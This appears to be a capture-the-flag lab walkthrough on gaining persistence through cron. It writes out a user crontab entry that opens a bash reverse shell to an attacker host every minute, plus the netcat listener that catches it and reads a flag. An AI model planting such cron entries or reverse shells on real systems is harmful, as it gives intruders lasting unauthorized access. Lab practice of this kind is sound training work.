# Persistence Via Cron Jobs

Access target via SSH
```bash
└─# ssh student@192.192.31.3                                              
student@192.192.31.3's password: 
Welcome to Ubuntu 18.04.2 LTS (GNU/Linux 6.8.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage
This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

student@demo:~$ 
```

```bash
student@demo:~$ cat /etc/cron*
cat: /etc/cron.d: Is a directory
cat: /etc/cron.daily: Is a directory
cat: /etc/cron.hourly: Is a directory
cat: /etc/cron.monthly: Is a directory
cat: /etc/cron.weekly: Is a directory
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#

# Set custom cronjob
student@demo:~$ echo "* * * * *  /bin/bash -c 'bash -i >& /dev/tcp/192.192.31.2/1234 0>&1'" > cron
student@demo:~$ cat cron
* * * * *  /bin/bash -c 'bash -i >& /dev/tcp/192.192.31.2/1234 0>&1'
student@demo:~$ crontab -l
* * * * *  /bin/bash -c 'bash -i >& /dev/tcp/192.192.31.2/1234 0>&1'

student@demo:~$ ls
cron  wait
student@demo:~$ rm wait
student@demo:~$ Connection to 192.192.31.3 closed by remote host.
Connection to 192.192.31.3 closed.

└─# ssh student@192.192.31.3                                              
student@192.192.31.3's password: 
Permission denied, please try again.
student@192.192.31.3's password: 

# Listening port
└─# nc -nvlp 1234
listening on [any] 1234 ...
connect to [192.192.31.2] from (UNKNOWN) [192.192.31.3] 33928
bash: cannot set terminal process group (442): Inappropriate ioctl for device
bash: no job control in this shell
student@demo:~$ 

student@demo:~$ ls
ls
cron
flag.txt
student@demo:~$ cat flag.txt
cat flag.txt
79969e32981f722464fde4ce7f208883
```